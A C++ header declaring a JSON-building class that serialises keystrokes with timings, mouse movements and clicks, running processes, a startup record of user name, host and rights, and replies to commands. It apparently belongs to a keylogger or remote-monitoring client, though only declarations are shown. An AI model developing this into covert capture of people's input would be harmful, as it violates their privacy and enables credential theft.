#pragma once

#include <string>

class sJson
{
public:
	sJson();
	~sJson();

	/* --- main JSON --- */
	void	initBufferActiveProcess();
	void	fillBufferActiveProcess();
	std::string getBufferActiveProcessFull();
	void	putActiveProcess(std::string const & path, std::string const & pName);
	/* --- */

	/* --- JSON function event */
	void	initBuffersEvent();
	void	putKeyboard(std::string const & key, std::string const & begin, std::string const & end);
	void	putMouseMove(double begX, double begY, double endX, double endY, std::string const & timeBeg);
	void	putMouseClick(double coordX, double coordY, std::string const & typeClick, std::string const & time);
	/* --- */
	/* --- JSON alone --- */
	std::string	putStartUp(std::string const & userName = "nothing",
		std::string const & hostName = "0.0.0.0",
		std::string const & userRights = "");
	std::string	putAnswerCommand(std::string const & cmd, std::string const & ret, std::string const & time);
	/* --- */
	/* --- Function getter --- */
	std::string const & getBuffer() const;
	std::string const & getKeyboard() const;
	std::string const & getMouseMove() const;
	std::string const & getMouseClick() const;
	/* --- */

	unsigned int getSizeBuffer() const;

private:

	void	clearBuffers();

	/* --- JSON function utility --- */
	void	fillJson(std::string & dest, std::string const & src, std::string const & title, bool check = true);
	void	fillJson(std::string & dest, double value, std::string const & title, bool check = true);
	/* --- */

	/* ---- Attributs JSON ----	*/
	std::string _buffer;
	std::string _keyboard;
	std::string _mouseMove;
	std::string _mouseClick;

	int			_firstKeyboard;
	int			_firstMouseMove;
	int			_firstMouseClick;
	/* ---- \Attributs JSON ----	*/
};

